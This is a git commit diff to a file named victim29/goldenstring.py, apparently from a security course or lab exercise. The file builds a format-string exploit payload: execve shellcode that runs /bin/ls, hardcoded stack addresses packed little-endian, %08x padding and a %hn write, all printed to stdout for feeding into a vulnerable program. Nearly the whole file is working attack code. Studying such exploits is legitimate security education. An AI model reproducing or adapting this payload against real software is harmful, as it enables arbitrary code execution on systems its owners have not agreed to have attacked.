c46deb5090fddf44e609143a22706ae6810354e6
Stephen Dean <stephendean2016@gmail.com>
2022-10-19 23:24:42 -0500

    format2

--- victim29/goldenstring.py
+++ victim29/goldenstring.py
@@ -1,3 +1,19 @@
-SHELLCODE = b""
+import sys
+import os
 
-print('\x8C\xE5\xFF\xBF\x8D\xE5\xFF\xBF\x8E\xE5\xFF\xBF\x8F\xE5\xFF\xBF\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls'+ '%08x.'* 317 + 'A'*99 + '%hhn%hhn%hhn%hhn'+ '%08x.'*50)
+SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
+
+ADDRESSTOWRITE = b'BFFFE58C'
+ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
+ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
+ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
+ADDRESSTOWRITE2 = ADDRESSTOWRITE2.to_bytes(4, 'little')
+
+ADDRESSOFSTRING = b'BFFFEA58'
+ADDRESSOFSHELLCODE = int(ADDRESSOFSTRING, 16) + 0x43
+ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(4, 'little'))
+LENTGHOFREQUIRED = 61
+
+with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
+    stdout.write(ADDRESSTOWRITE1 + ADDRESSTOWRITE2 + b'%08x.'*317 + b'%hn' + SHELLCODE)
+
